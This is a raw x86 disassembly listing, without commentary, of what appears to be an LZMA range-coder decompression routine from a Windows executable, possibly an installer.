  406490:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406494:	0f 84 e2 09 00 00    	je     0x406e7c
  40649a:	8b 45 90             	mov    -0x70(%ebp),%eax
  40649d:	ff 4d 94             	decl   -0x6c(%ebp)
  4064a0:	ff 45 90             	incl   -0x70(%ebp)
  4064a3:	8a 00                	mov    (%eax),%al
  4064a5:	3c e1                	cmp    $0xe1,%al
  4064a7:	0f 87 e4 09 00 00    	ja     0x406e91
  4064ad:	0f b6 c0             	movzbl %al,%eax
  4064b0:	6a 2d                	push   $0x2d
  4064b2:	99                   	cltd
  4064b3:	59                   	pop    %ecx
  4064b4:	f7 f9                	idiv   %ecx
  4064b6:	6a 09                	push   $0x9
  4064b8:	59                   	pop    %ecx
  4064b9:	8b f0                	mov    %eax,%esi
  4064bb:	0f b6 c2             	movzbl %dl,%eax
  4064be:	99                   	cltd
  4064bf:	f7 f9                	idiv   %ecx
  4064c1:	8b ce                	mov    %esi,%ecx
  4064c3:	0f b6 fa             	movzbl %dl,%edi
  4064c6:	33 d2                	xor    %edx,%edx
  4064c8:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  4064cb:	42                   	inc    %edx
  4064cc:	d3 e2                	shl    %cl,%edx
  4064ce:	8b c8                	mov    %eax,%ecx
  4064d0:	4a                   	dec    %edx
  4064d1:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4064d4:	33 d2                	xor    %edx,%edx
  4064d6:	42                   	inc    %edx
  4064d7:	d3 e2                	shl    %cl,%edx
  4064d9:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  4064dc:	be 00 03 00 00       	mov    $0x300,%esi
  4064e1:	d3 e6                	shl    %cl,%esi
  4064e3:	4a                   	dec    %edx
  4064e4:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4064e7:	81 c6 36 07 00 00    	add    $0x736,%esi
  4064ed:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  4064f0:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  4064f3:	74 26                	je     0x40651b
  4064f5:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4064f9:	74 09                	je     0x406504
  4064fb:	ff 75 fc             	push   -0x4(%ebp)
  4064fe:	ff 15 5c 71 40 00    	call   *0x40715c
  406504:	57                   	push   %edi
  406505:	6a 40                	push   $0x40
  406507:	ff 15 58 71 40 00    	call   *0x407158
  40650d:	85 c0                	test   %eax,%eax
  40650f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406512:	0f 84 79 09 00 00    	je     0x406e91
  406518:	89 7d 88             	mov    %edi,-0x78(%ebp)
  40651b:	85 f6                	test   %esi,%esi
  40651d:	74 0c                	je     0x40652b
  40651f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406522:	4e                   	dec    %esi
  406523:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
  406529:	75 f4                	jne    0x40651f
  40652b:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  40652f:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406533:	eb 26                	jmp    0x40655b
  406535:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406539:	0f 84 a6 08 00 00    	je     0x406de5
  40653f:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406542:	ff 4d 94             	decl   -0x6c(%ebp)
  406545:	8b c8                	mov    %eax,%ecx
  406547:	8b 45 90             	mov    -0x70(%ebp),%eax
  40654a:	c1 e1 03             	shl    $0x3,%ecx
  40654d:	0f b6 00             	movzbl (%eax),%eax
  406550:	d3 e0                	shl    %cl,%eax
  406552:	09 45 c0             	or     %eax,-0x40(%ebp)
  406555:	ff 45 90             	incl   -0x70(%ebp)
  406558:	ff 45 b8             	incl   -0x48(%ebp)
  40655b:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  40655f:	7c d4                	jl     0x406535
  406561:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406564:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406567:	74 28                	je     0x406591
  406569:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40656d:	89 45 8c             	mov    %eax,-0x74(%ebp)
  406570:	74 09                	je     0x40657b
  406572:	ff 75 f8             	push   -0x8(%ebp)
  406575:	ff 15 5c 71 40 00    	call   *0x40715c
  40657b:	ff 75 c0             	push   -0x40(%ebp)
  40657e:	6a 40                	push   $0x40
  406580:	ff 15 58 71 40 00    	call   *0x407158
  406586:	85 c0                	test   %eax,%eax
  406588:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40658b:	0f 84 00 09 00 00    	je     0x406e91
  406591:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406594:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  406597:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  40659e:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  4065a3:	eb 21                	jmp    0x4065c6
  4065a5:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4065a9:	0f 84 45 08 00 00    	je     0x406df4
  4065af:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4065b2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4065b5:	ff 4d 94             	decl   -0x6c(%ebp)
  4065b8:	0f b6 09             	movzbl (%ecx),%ecx
  4065bb:	c1 e0 08             	shl    $0x8,%eax
  4065be:	0b c1                	or     %ecx,%eax
  4065c0:	ff 45 90             	incl   -0x70(%ebp)
  4065c3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4065c6:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4065c9:	ff 4d b8             	decl   -0x48(%ebp)
  4065cc:	85 c0                	test   %eax,%eax
  4065ce:	75 d5                	jne    0x4065a5
  4065d0:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4065d3:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4065d6:	23 45 e4             	and    -0x1c(%ebp),%eax
  4065d9:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  4065e0:	00 00 00 
  4065e3:	c1 e1 04             	shl    $0x4,%ecx
  4065e6:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4065e9:	03 c8                	add    %eax,%ecx
  4065eb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4065ee:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  4065f1:	e9 6c 06 00 00       	jmp    0x406c62
  4065f6:	33 d2                	xor    %edx,%edx
  4065f8:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  4065fb:	75 6f                	jne    0x40666c
  4065fd:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  406601:	8b 75 a0             	mov    -0x60(%ebp),%esi
  406604:	b1 08                	mov    $0x8,%cl
  406606:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  406609:	23 75 e8             	and    -0x18(%ebp),%esi
  40660c:	d3 e8                	shr    %cl,%eax
  40660e:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  406611:	d3 e6                	shl    %cl,%esi
  406613:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406616:	03 c6                	add    %esi,%eax
  406618:	8d 04 40             	lea    (%eax,%eax,2),%eax
  40661b:	c1 e0 09             	shl    $0x9,%eax
  40661e:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  406622:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  406629:	89 45 a8             	mov    %eax,-0x58(%ebp)
  40662c:	7d 05                	jge    0x406633
  40662e:	89 55 c8             	mov    %edx,-0x38(%ebp)
  406631:	eb 10                	jmp    0x406643
  406633:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  406637:	7d 06                	jge    0x40663f
  406639:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  40663d:	eb 04                	jmp    0x406643
  40663f:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  406643:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  406646:	74 1c                	je     0x406664
  406648:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40664b:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  40664e:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406651:	72 03                	jb     0x406656
  406653:	03 45 8c             	add    -0x74(%ebp),%eax
  406656:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406659:	33 db                	xor    %ebx,%ebx
  40665b:	43                   	inc    %ebx
  40665c:	8a 04 08             	mov    (%eax,%ecx,1),%al
  40665f:	88 45 a5             	mov    %al,-0x5b(%ebp)
  406662:	eb 68                	jmp    0x4066cc
  406664:	33 db                	xor    %ebx,%ebx
  406666:	43                   	inc    %ebx
  406667:	e9 cd 01 00 00       	jmp    0x406839
  40666c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40666f:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406672:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  406679:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  406680:	00 00 00 
  406683:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  40668a:	e9 d3 05 00 00       	jmp    0x406c62
  40668f:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406693:	0f 84 67 07 00 00    	je     0x406e00
  406699:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40669c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40669f:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4066a3:	0f b6 09             	movzbl (%ecx),%ecx
  4066a6:	ff 4d 94             	decl   -0x6c(%ebp)
  4066a9:	c1 e0 08             	shl    $0x8,%eax
  4066ac:	0b c1                	or     %ecx,%eax
  4066ae:	ff 45 90             	incl   -0x70(%ebp)
  4066b1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4066b4:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4066b7:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  4066ba:	0f 85 ad 00 00 00    	jne    0x40676d
  4066c0:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  4066c6:	0f 8d 05 01 00 00    	jge    0x4067d1
  4066cc:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
  4066d0:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  4066d3:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4066d6:	c1 e8 07             	shr    $0x7,%eax
  4066d9:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4066dc:	40                   	inc    %eax
  4066dd:	c1 e0 08             	shl    $0x8,%eax
  4066e0:	03 c3                	add    %ebx,%eax
  4066e2:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  4066e5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4066e8:	c1 e9 0b             	shr    $0xb,%ecx
  4066eb:	66 8b 06             	mov    (%esi),%ax
  4066ee:	89 75 ac             	mov    %esi,-0x54(%ebp)
  4066f1:	0f b7 d0             	movzwl %ax,%edx
  4066f4:	0f af ca             	imul   %edx,%ecx
  4066f7:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  4066fa:	73 1a                	jae    0x406716
  4066fc:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406700:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406703:	b9 00 08 00 00       	mov    $0x800,%ecx
  406708:	2b ca                	sub    %edx,%ecx
  40670a:	c1 f9 05             	sar    $0x5,%ecx
  40670d:	03 c8                	add    %eax,%ecx
  40670f:	03 db                	add    %ebx,%ebx
  406711:	66 89 0e             	mov    %cx,(%esi)
  406714:	eb 1d                	jmp    0x406733
  406716:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406719:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  40671c:	66 8b c8             	mov    %ax,%cx
  40671f:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406726:	66 c1 e9 05          	shr    $0x5,%cx
  40672a:	2b c1                	sub    %ecx,%eax
  40672c:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  406730:	66 89 06             	mov    %ax,(%esi)
  406733:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40673a:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40673d:	0f 83 71 ff ff ff    	jae    0x4066b4
  406743:	e9 47 ff ff ff       	jmp    0x40668f
  406748:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40674c:	0f 84 ba 06 00 00    	je     0x406e0c
  406752:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406755:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406758:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  40675c:	0f b6 09             	movzbl (%ecx),%ecx
  40675f:	ff 4d 94             	decl   -0x6c(%ebp)
  406762:	c1 e0 08             	shl    $0x8,%eax
  406765:	0b c1                	or     %ecx,%eax
  406767:	ff 45 90             	incl   -0x70(%ebp)
  40676a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40676d:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406773:	7d 5c                	jge    0x4067d1
  406775:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406778:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  40677b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40677e:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406781:	c1 e9 0b             	shr    $0xb,%ecx
  406784:	66 8b 06             	mov    (%esi),%ax
  406787:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40678a:	0f b7 f8             	movzwl %ax,%edi
  40678d:	0f af cf             	imul   %edi,%ecx
  406790:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406793:	73 16                	jae    0x4067ab
  406795:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406798:	b9 00 08 00 00       	mov    $0x800,%ecx
  40679d:	2b cf                	sub    %edi,%ecx
  40679f:	c1 f9 05             	sar    $0x5,%ecx
  4067a2:	03 c8                	add    %eax,%ecx
  4067a4:	03 db                	add    %ebx,%ebx
  4067a6:	66 89 0e             	mov    %cx,(%esi)
  4067a9:	eb 15                	jmp    0x4067c0
  4067ab:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  4067ae:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  4067b1:	66 8b c8             	mov    %ax,%cx
  4067b4:	8d 5a 01             	lea    0x1(%edx),%ebx
  4067b7:	66 c1 e9 05          	shr    $0x5,%cx
  4067bb:	2b c1                	sub    %ecx,%eax
  4067bd:	66 89 06             	mov    %ax,(%esi)
  4067c0:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4067c7:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4067ca:	73 a1                	jae    0x40676d
  4067cc:	e9 77 ff ff ff       	jmp    0x406748
  4067d1:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  4067d5:	8a 45 bc             	mov    -0x44(%ebp),%al
  4067d8:	88 45 a4             	mov    %al,-0x5c(%ebp)
  4067db:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  4067df:	0f 84 3f 06 00 00    	je     0x406e24
  4067e5:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  4067e8:	8a 45 a4             	mov    -0x5c(%ebp),%al
  4067eb:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4067ee:	ff 45 a0             	incl   -0x60(%ebp)
  4067f1:	ff 45 98             	incl   -0x68(%ebp)
  4067f4:	ff 4d 9c             	decl   -0x64(%ebp)
  4067f7:	88 01                	mov    %al,(%ecx)
  4067f9:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4067fc:	88 04 11             	mov    %al,(%ecx,%edx,1)
  4067ff:	8d 41 01             	lea    0x1(%ecx),%eax
  406802:	33 d2                	xor    %edx,%edx
  406804:	f7 75 8c             	divl   -0x74(%ebp)
  406807:	e9 95 01 00 00       	jmp    0x4069a1
  40680c:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406810:	0f 84 02 06 00 00    	je     0x406e18
  406816:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406819:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40681c:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406820:	0f b6 09             	movzbl (%ecx),%ecx
  406823:	ff 4d 94             	decl   -0x6c(%ebp)
  406826:	c1 e0 08             	shl    $0x8,%eax
  406829:	0b c1                	or     %ecx,%eax
  40682b:	ff 45 90             	incl   -0x70(%ebp)
  40682e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406831:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406837:	7d 9c                	jge    0x4067d5
  406839:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40683c:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  40683f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406842:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406845:	c1 e9 0b             	shr    $0xb,%ecx
  406848:	66 8b 06             	mov    (%esi),%ax
  40684b:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40684e:	0f b7 f8             	movzwl %ax,%edi
  406851:	0f af cf             	imul   %edi,%ecx
  406854:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406857:	73 16                	jae    0x40686f
  406859:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40685c:	b9 00 08 00 00       	mov    $0x800,%ecx
  406861:	2b cf                	sub    %edi,%ecx
  406863:	c1 f9 05             	sar    $0x5,%ecx
  406866:	03 c8                	add    %eax,%ecx
  406868:	03 db                	add    %ebx,%ebx
  40686a:	66 89 0e             	mov    %cx,(%esi)
  40686d:	eb 15                	jmp    0x406884
  40686f:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406872:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406875:	66 8b c8             	mov    %ax,%cx
  406878:	8d 5a 01             	lea    0x1(%edx),%ebx
  40687b:	66 c1 e9 05          	shr    $0x5,%cx
  40687f:	2b c1                	sub    %ecx,%eax
  406881:	66 89 06             	mov    %ax,(%esi)
  406884:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40688b:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40688e:	73 a1                	jae    0x406831
  406890:	e9 77 ff ff ff       	jmp    0x40680c
  406895:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  406899:	75 1c                	jne    0x4068b7
  40689b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40689e:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4068a1:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  4068a8:	00 00 00 
  4068ab:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  4068b2:	e9 ab 03 00 00       	jmp    0x406c62
  4068b7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4068ba:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  4068c1:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4068c4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4068c7:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4068ca:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4068cd:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4068d0:	33 c0                	xor    %eax,%eax
  4068d2:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  4068d6:	0f 9d c0             	setge  %al
  4068d9:	48                   	dec    %eax
  4068da:	24 fd                	and    $0xfd,%al
  4068dc:	83 c0 0a             	add    $0xa,%eax
  4068df:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4068e2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4068e5:	05 64 06 00 00       	add    $0x664,%eax
  4068ea:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4068ed:	8b 75 a8             	mov    -0x58(%ebp),%esi
  4068f0:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  4068f7:	00 00 00 
  4068fa:	e9 63 03 00 00       	jmp    0x406c62
  4068ff:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406903:	75 21                	jne    0x406926
  406905:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406908:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40690b:	83 c0 0f             	add    $0xf,%eax
  40690e:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  406915:	00 00 00 
  406918:	c1 e0 04             	shl    $0x4,%eax
  40691b:	03 45 b4             	add    -0x4c(%ebp),%eax
  40691e:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406921:	e9 3c 03 00 00       	jmp    0x406c62
  406926:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406929:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40692c:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  406933:	00 00 00 
  406936:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  40693d:	e9 20 03 00 00       	jmp    0x406c62
  406942:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406946:	0f 85 b1 00 00 00    	jne    0x4069fd
  40694c:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  406950:	0f 84 3b 05 00 00    	je     0x406e91
  406956:	33 c0                	xor    %eax,%eax
  406958:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  40695c:	0f 9d c0             	setge  %al
  40695f:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  406963:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406966:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  40696a:	0f 84 c0 04 00 00    	je     0x406e30
  406970:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406973:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406976:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406979:	72 03                	jb     0x40697e
  40697b:	03 45 8c             	add    -0x74(%ebp),%eax
  40697e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406981:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406984:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406987:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  40698a:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  40698d:	40                   	inc    %eax
  40698e:	33 d2                	xor    %edx,%edx
  406990:	f7 75 8c             	divl   -0x74(%ebp)
  406993:	8b 45 98             	mov    -0x68(%ebp),%eax
  406996:	ff 45 a0             	incl   -0x60(%ebp)
  406999:	ff 45 98             	incl   -0x68(%ebp)
  40699c:	ff 4d 9c             	decl   -0x64(%ebp)
  40699f:	88 08                	mov    %cl,(%eax)
  4069a1:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4069a4:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  4069ab:	00 00 00 
  4069ae:	e9 c7 fa ff ff       	jmp    0x40647a
  4069b3:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4069b7:	75 05                	jne    0x4069be
  4069b9:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4069bc:	eb 36                	jmp    0x4069f4
  4069be:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4069c1:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4069c4:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  4069cb:	00 00 00 
  4069ce:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  4069d5:	e9 88 02 00 00       	jmp    0x406c62
  4069da:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4069de:	75 05                	jne    0x4069e5
  4069e0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4069e3:	eb 09                	jmp    0x4069ee
  4069e5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4069e8:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4069eb:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4069ee:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4069f1:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4069f4:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4069f7:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4069fa:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4069fd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a00:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  406a07:	05 68 0a 00 00       	add    $0xa68,%eax
  406a0c:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406a0f:	e9 d9 fe ff ff       	jmp    0x4068ed
  406a14:	33 c0                	xor    %eax,%eax
  406a16:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406a1a:	0f 9d c0             	setge  %al
  406a1d:	48                   	dec    %eax
  406a1e:	24 fd                	and    $0xfd,%al
  406a20:	83 c0 0b             	add    $0xb,%eax
  406a23:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406a26:	e9 9a 01 00 00       	jmp    0x406bc5
  406a2b:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406a2e:	83 f8 04             	cmp    $0x4,%eax
  406a31:	7c 03                	jl     0x406a36
  406a33:	6a 03                	push   $0x3
  406a35:	58                   	pop    %eax
  406a36:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406a39:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  406a40:	c1 e0 07             	shl    $0x7,%eax
  406a43:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  406a4a:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  406a51:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406a54:	e9 ce 02 00 00       	jmp    0x406d27
  406a59:	83 fb 04             	cmp    $0x4,%ebx
  406a5c:	7c 34                	jl     0x406a92
  406a5e:	8b cb                	mov    %ebx,%ecx
  406a60:	8b c3                	mov    %ebx,%eax
  406a62:	d1 f9                	sar    $1,%ecx
  406a64:	83 e0 01             	and    $0x1,%eax
  406a67:	49                   	dec    %ecx
  406a68:	0c 02                	or     $0x2,%al
  406a6a:	d3 e0                	shl    %cl,%eax
  406a6c:	83 fb 0e             	cmp    $0xe,%ebx
  406a6f:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406a72:	7d 14                	jge    0x406a88
  406a74:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406a77:	2b c3                	sub    %ebx,%eax
  406a79:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  406a7c:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  406a83:	e9 81 00 00 00       	jmp    0x406b09
  406a88:	33 db                	xor    %ebx,%ebx
  406a8a:	83 c1 fc             	add    $0xfffffffc,%ecx
  406a8d:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  406a90:	eb 33                	jmp    0x406ac5
  406a92:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  406a95:	e9 28 01 00 00       	jmp    0x406bc2
  406a9a:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406a9e:	0f 84 98 03 00 00    	je     0x406e3c
  406aa4:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406aa7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406aaa:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406aae:	0f b6 09             	movzbl (%ecx),%ecx
  406ab1:	ff 4d 94             	decl   -0x6c(%ebp)
  406ab4:	c1 e0 08             	shl    $0x8,%eax
  406ab7:	0b c1                	or     %ecx,%eax
  406ab9:	ff 45 90             	incl   -0x70(%ebp)
  406abc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406abf:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406ac2:	ff 4d b8             	decl   -0x48(%ebp)
  406ac5:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  406ac9:	7e 27                	jle    0x406af2
  406acb:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406ace:	03 db                	add    %ebx,%ebx
  406ad0:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  406ad3:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  406ad6:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406ad9:	72 0c                	jb     0x406ae7
  406adb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406ade:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406ae1:	83 cb 01             	or     $0x1,%ebx
  406ae4:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406ae7:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406aee:	73 d2                	jae    0x406ac2
  406af0:	eb a8                	jmp    0x406a9a
  406af2:	c1 e3 04             	shl    $0x4,%ebx
  406af5:	03 c3                	add    %ebx,%eax
  406af7:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  406afe:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406b01:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b04:	05 44 06 00 00       	add    $0x644,%eax
  406b09:	33 db                	xor    %ebx,%ebx
  406b0b:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406b0e:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
